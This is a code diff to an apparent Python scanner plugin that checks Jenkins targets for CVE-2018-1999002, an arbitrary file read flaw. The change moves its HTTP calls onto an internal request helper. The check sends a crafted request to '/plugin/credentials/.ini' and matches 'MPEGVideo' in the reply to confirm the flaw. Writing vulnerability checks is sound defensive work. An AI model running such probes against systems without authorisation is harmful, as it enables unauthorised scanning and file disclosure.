@@ -5,9 +5,8 @@ name: CVE-2018-1999002漏洞
 description: CVE-2018-1999002漏洞可任意读取文件,在Linux条件下利用比较困难,则需要一个带有_的目录才能利用
 '''
 
-import requests
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
-requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+from app.lib.utils.request import request
+
 
 class CVE_2018_1999002_BaseVerify:
     def __init__(self, url):
@@ -23,7 +22,7 @@ class CVE_2018_1999002_BaseVerify:
             self.url = "http://" + self.url
         try:
             check_url =  self.url + '/plugin/credentials/.ini'
-            check_req = requests.get(check_url, headers = self.header, allow_redirects = False, verify=False)
+            check_req = request.get(check_url, headers = self.header)
             if "MPEGVideo" in check_req.text and check_req.status_code == 200:
                 print('存在CVE-2018-1999002漏洞')
                 return True
